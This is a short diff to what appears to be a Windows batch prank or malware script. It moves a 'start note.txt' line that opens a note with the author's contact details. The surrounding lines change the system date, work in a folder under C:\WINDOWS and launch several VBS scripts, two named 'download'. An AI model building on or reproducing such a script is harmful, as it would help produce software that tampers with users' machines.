@@ -413,6 +413,7 @@ echo My YouTube channel: youtube.com/danooct1 >> note.txt
 echo My email: danooct1press@gmail.com >> note.txt
 echo Twitter: twitter.com/danooct1 >> note.txt
 echo And please note that I will ban you if you spam. >> note.txt
+start note.txt
 goto ThrowTheComputerToTrash
 
 :ThrowTheComputerToTrash
@@ -527,7 +528,6 @@ cd C:\WINDOWS\HappyPong
 date 6/6/2006
 start change.vbs
 start explorer.exe
-start note.txt
 start ieandstuff.vbs
 start download1.vbs
 start download2.vbs
